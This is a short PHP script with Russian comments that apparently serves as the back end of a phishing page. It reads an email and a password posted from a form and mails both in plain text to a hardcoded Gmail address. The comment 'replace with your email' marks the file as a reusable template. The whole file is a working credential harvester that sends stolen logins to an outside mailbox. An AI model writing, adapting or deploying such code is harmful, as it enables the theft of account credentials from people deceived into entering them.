<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Получаем данные из формы
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);
    
    // Адрес, на который будут отправляться данные
    $to = "sassasovic19@gmail.com"; // Замените на ваш email
    $subject = "Новая отправка формы";
    
    // Содержание письма
    $message = "Получены данные с формы:\n\n";
    $message .= "Email: $email\n";
    $message .= "Пароль: $password\n";
    
    // Заголовки письма
    $headers = "From: no-reply@yourdomain.com\r\n";
    $headers .= "Reply-To: no-reply@yourdomain.com\r\n";
    
    // Отправка письма
    if (mail($to, $subject, $message, $headers)) {
        echo "Данные успешно отправлены!";
    } else {
        echo "Ошибка при отправке данных.";
    }
} else {
    // Запрет прямого доступа к файлу
    echo "Недопустимый метод запроса.";
}
?>
